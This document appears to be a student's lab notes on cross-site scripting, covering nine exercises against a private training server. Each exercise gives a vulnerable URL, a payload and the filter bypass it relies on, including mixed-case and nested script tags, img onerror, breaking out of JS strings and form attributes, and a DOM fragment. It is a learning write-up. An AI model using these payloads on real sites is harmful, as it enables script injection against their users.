---
aliases:
---
# XSS

---
## Example 1 - Pop Up Script

`172.16.219.145/xss/example1.php?name=hacker`
- the site echos whatever we put in the query string `?name=...` into site's html
### Payload
`?name=<script>alert('XSS')</script>`
- we can execute our JS on the site

!<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413133624.png" width="600"/>

---

## Example 2 - Case Sensitivity

`172.16.219.145/xss/example2.php?name=hacker`
- developer attempts to block `<script>`
### Payload

`?name=<sCrIpt>alert('XSS')</SCRipt>`
- changing some chars to uppercase bypasses filter

!<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413134439.png" width="600"/>

---

## Example 3 - URL Strip

`172.16.219.145/xss/example3.php?name=hacker`
- the site strips `<script>` from the URL

### Payload

`?name=<<script>script>alert('XSS')<</script>/script>`

- the site removes `<script>` from `<<script>script>`
	- leaving `<script>`

!<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413134847.png" width="600"/>
---

## Example 4 - `<script>` Workaround

`172.16.219.145/xss/example4.php?name=hacker`
- no matter what the developer blocks `<script>` in URL

### Payload
`?name=<img src=/ onerror="alert('XSS')">`
- there are many ways to bypass this in JS, here we use the `<img` tag

!<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413140830.png" width="600"/>

---

## Example 5 - `alert()` Workaround

`172.16.219.145/xss/example5.php?name=hacker`
- on `alert` being in the URL, the developer returns an error

### Payload

`?name=<script>prompt('XSS')</script>`
- we can use another version of payloads using `prompt`

!<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413142623.png" width="600"/>

---

## Example 6 - `</script>` Traversal

`172.16.219.145/xss/example6.php?name=hacker`
- on using our payloads, the site returns **Hello ";**

!<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413143514.png" width="400"/>

- upon inspecting the source code, we find the developer has made an initial `<script>` tag
	- to negate our `<script>` in payload.
!<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413143734.png" width="400"/>

### Payload

`?name=</script><script>alert('XSS')</script>`
- we add a `</script>` tag
	- to deactivate the developer's`<script>` tag, which enables our payload

!<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413143855.png" width="600"/>

!<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413144024.png" width="400"/>

---

## Example 7 - HTML-Encode Bypass

`http://172.16.219.145/xss/example7.php?name=hacker`
- we use try the same payload as example 6
	- because `<script>` needs to be deactivated again
- upon submitting, the sites source shows our payload as encoded
	- **HTML-Encode**
	- prevents tags or script execution

!<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413151534.png" width="400"/>

### Payload

`?name=';alert('XSS');//`
- HTML-Encode does format JS Functions

!<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413152650.png" width="600"/>

!<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413152707.png" width="400"/>

- `'` encloses the original `'`
- `;` calls this as a JS function
- `//` comments the rest to avoid syntax errors

---

## Example 8 - Form XSS

`172.16.219.145/xss/example8.php`
- site is slightly different, there is a box you can put your name into.
	- we immediately dig into source code
### Payload

`/"><script>alert('XSS')</script>`
- `/">` closes form tag

!<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413153438.png" width="600"/>

!<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413153241.png" width="500"/>

---

## Example 9 - document.write XSS

`http://172.16.219.145/xss/example9.php#hacker`
- the site writes everything right of `#` into the site

!<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413154538.png" width="350"/>

!<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413154613.png" width="400"/>

### Payload

`#<script>alert('XSS')</script>`
- NOTE: doesn't work in all browsers
	- Firefox has prevention against this

---

Last Updated: 20250413